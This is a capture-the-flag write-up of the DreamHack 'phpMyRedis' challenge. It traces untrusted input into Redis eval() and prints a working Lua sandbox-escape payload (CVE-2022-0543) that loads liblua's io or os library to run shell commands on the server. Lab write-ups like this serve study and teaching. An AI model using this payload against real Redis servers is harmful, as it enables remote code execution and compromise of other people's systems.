---
title: DreamHack - [phpMyRedis challenge writeup]
published: 2025-11-25
description: Writeup for the phpMyRedis challenge (level 3)
image: ''
tags: [DreamHack, level-3, php]
category: Writeups
draft: false
---

# Browse the app functionalities
The core files are `index.php` and `config.php`.

## index.php
This file allows to type in the command, save the result, and store the command history.

**Redis** runs the `$_POST['cmd']` command using `$redis->eval()`, then saves the command in `$_SESSION[history_{cnt}]`. It saves the command result in file *./data/{session_id}*, with the data as
```
> {cmd}
--------------------------------
{result}
```
==Untrusted data==
1. `$_POST['cmd']`: This flows into `$redis->eval()`, which executes a LUA script serverside. [read here](https://github.com/phpredis/phpredis?tab=readme-ov-file#eval)

## config.php
This file allows us to get or set a key. The form includes the `key` and `value`.

If option is GET (`$_POST['option'] == 'GET'`), it gets the Redis server configuration parameters and returns an associative array <br> {key(s) $\rightarrow$ value(s)}.
If option is SET (`$_POST['option'] == 'SET'`), it sets the Redis server configuration parameters and returns  *bool*.

Then it prints out the result.
==Untrusted data==
1. `$_POST['option']`
2. `$_POST['key']`
3. `$_POST['value']`

All these 3 untrusted data flow into the `$redis->config()`. [read here](https://github.com/phpredis/phpredis?tab=readme-ov-file#config)

# My thinking flow
I don't know much about Redis, so let's gather some information to know what I'm gonna do.
Read the Dockerfile, it states that the flag is in the root directory and it is a binary file, thus, we have to execute it. This probably hints that we need to exploit the *Command Injection* and *Remote Code Execution* vulnerablity. Indeed, we do have the untrusted data `$_POST['cmd']` flows into an unsafe method `eval()`.

The `eval()` in redis executes LUA script. As I search online, Redis LUA does not allow to run shell command. It only exposes `redis.call()`, basic math, table, and string operations. But I don't think I will stop here, I have some suspicious that there might be some ways to actually execute the OS command.

Read its [document](https://redis.io/docs/latest/develop/programmability/lua-api/), the LUA scripts are runned in a sandboxed context and can only access specific Lua packages. 

I went on Google and searched "Redis LUA escape sandbox CVE", and found this url https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce, which explains the **CVE-2022-0543**.

This url stated that we can escape the sandbox with this payload.
```lua
eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so", "luaopen_os"); local os = os_l(); os.execute("touch /tmp/redis_poc"); return 0'
```
> Actually, the correct packet must be /usr/lib/x86_64-linux-gnu/liblua5.1.so.0, and the better lib to use is luaopen_io, because it prints the result to stdout. `os.execute()` only returns exit code.

So I try with payload
```lua
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); 
local io = io_l(); 
local f = io.popen("/flag", "r"); 
local res = f:read("*a"); 
f:close(); 
return res
```

And we get the flag.